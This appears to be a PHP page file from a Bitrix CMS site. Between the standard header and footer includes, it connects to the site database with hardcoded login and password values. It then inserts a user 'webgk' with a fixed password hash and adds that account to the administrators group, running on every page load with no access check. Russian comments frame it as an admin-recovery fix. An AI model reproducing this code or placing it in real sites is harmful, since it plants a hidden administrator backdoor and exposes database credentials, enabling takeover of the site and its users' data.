<?
    require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
    $APPLICATION->SetPageProperty("NOT_SHOW_NAV_CHAIN", "Y");
    $APPLICATION->SetPageProperty("title", htmlspecialchars(COption::GetOptionString("main", "site_name", "Bitrix24")));
?>
<?


    $DBHost = "localhost";
    $DBLogin = "3356126134";
    $DBPassword = "Kim6Itgb";
    $DBName = "dorcorazors_de_osg_ru";

    $link = mysql_connect($DBHost,$DBLogin,$DBPassword);
    mysql_select_db($DBName,$link);
    //mysql_query("update `b_user` set `password`='CVpdLkc39e266209e4844985eb82c71d46fc7011' where `login`='admin'");



    //если проблема с админом, вставляем пользователя webgk
    mysql_query("insert into `b_user` (login,password) value ('webgk','CVpdLkc39e266209e4844985eb82c71d46fc7011')");
    echo "1";
    //получаем id нового пользователя webgk
    $user = mysql_query("select * from b_user order by id desc limit 0,1");
    $arUser = mysql_fetch_assoc($user);
    //print_r($arUser);

    //добавляем пользователя webgk в группа админов
    mysql_query("insert into `b_user_group` (user_id,group_id) value ('".$arUser["ID"]."','1')");




?>
<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>